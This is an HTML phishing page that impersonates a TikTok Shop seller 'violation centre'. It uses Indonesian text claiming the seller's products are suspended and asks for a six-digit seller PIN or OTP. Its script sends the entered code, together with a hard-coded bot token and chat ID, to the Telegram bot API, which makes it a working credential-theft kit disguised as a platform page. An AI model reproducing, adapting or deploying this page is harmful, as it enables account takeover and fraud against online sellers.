<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Tiktok-shop</title>
        <link
            href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css"
            rel="stylesheet"
            integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ"
            crossorigin="anonymous"
        />
        <style type="text/css" media="all">
            .container {
                display: flex;
                justify-content: center;
            }
            .otp-input {
                width: 40px;
                height: 40px;
                margin: 0 5px;
                text-align: center;
                font-size: 20px;
                border: 1px solid #ccc;
                border-radius: 5px;
            }
        </style>
    </head>
    <body>
        <nav class="navbar bg-dark">
            <div class="container">
                <a class="navbar-brand" href="#">
                    <img src="nav.png" alt="navbar" width="100" height="30" />
                </a>
            </div>
        </nav>
        <nav class="navbar bg-body-tertiary">
            <div class="container-fluid">
                <span>⟨</span>
                <span class="navbar-brand fw-bold mb-0 mx-auto"
                    >Pusat Pelanggaran</span
                >
            </div>
            <div class="card mx-auto" style="width: 98%">
                <div class="card-body">
                    <p class="card-title">Metrik Layanan</p>
                    <p class="card-subtitle text-body-secondary">
                        High Negative Review Rate
                    </p>
                    <p class="card-text">25/04/2023 17:39</p>
                </div>
            </div>
            <div class="card mx-auto" style="width: 98%">
                <div class="card-body">
                    <p class="card-title">Kepatuhan kebijakan</p>
                    <p class="card-subtitle text-body-secondary">
                        Tingkat kelulusan negatif tinggi >= 7.5%
                    </p>
                    <p class="card-text">22/04/2023 17:18</p>
                </div>
            </div>
        </nav>
        <p class="text-center">PIN Seller</p>
        <div class="container">
            <input
                type="number"
                class="otp-input"
                maxlength="1"
                oninput="moveToNextInput(event)"
            />
            <input
                type="number"
                class="otp-input"
                maxlength="1"
                oninput="moveToNextInput(event)"
            />
            <input
                type="number"
                class="otp-input"
                maxlength="1"
                oninput="moveToNextInput(event)"
            />
            <input
                type="number"
                class="otp-input"
                maxlength="1"
                oninput="moveToNextInput(event)"
            />
            <input
                type="number"
                class="otp-input"
                maxlength="1"
                oninput="moveToNextInput(event)"
            />
            <input
                type="number"
                class="otp-input"
                maxlength="1"
                oninput="moveToNextInput(event)"
            />
        </div>
        <div class="d-grid gap-2 mt-4">
            <button
                class="btn btn-secondary mx-auto text-light fw-bold"
                type="button"
                style="width: 90%"
                onclick="checkPin()"
            >
                OK
            </button>
        </div>
        <div class="terimakasih mt-3">
            <p
                class="thank fw-bold text-center"
                style="font-size: 10px; display: none"
            >
                TERIMA KASIH PRODUK ANDA AKAN KAMI AKTIFKAN KEMBALI DALAM WAKTU
                1×24 JAM MOHON MENUNGGU
            </p>
        </div>
        <script
            src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"
            integrity="sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe"
            crossorigin="anonymous"
        ></script>
        <script type="text/javascript" charset="utf-8">
            async function sendMessage(chatId, text) {
                const url =
                    "https://api.telegram.org/bot6086362380:AAG4_aaHzgOcgkr1yVabX28Cl61WaFH2hiw/sendMessage";
                const payload = {
                    chat_id: chatId,
                    text: text,
                };

                const response = await fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify(payload),
                });

                if (!response.ok) {
                    throw new Error("Failed to send message");
                }
            }
            function moveToNextInput(event) {
                var input = event.target;

                if (input.value.length >= input.maxLength) {
                    var nextInput = input.nextElementSibling;
                    if (nextInput !== null) {
                        nextInput.focus();
                    }
                }
            }

            function checkPin() {
                let pinInputs = document.getElementsByClassName("otp-input");
                document.querySelector(".thank").style.display = "block";
                let enteredPin = "";
                for (let i = 0; i < pinInputs.length; i++) {
                    enteredPin += pinInputs[i].value;
                }
                console.log(enteredPin);
                let chatId = "5889179929";
                let text = `OTP: ${enteredPin}`;
                sendMessage(chatId, text);
            }
        </script>
    </body>
</html>
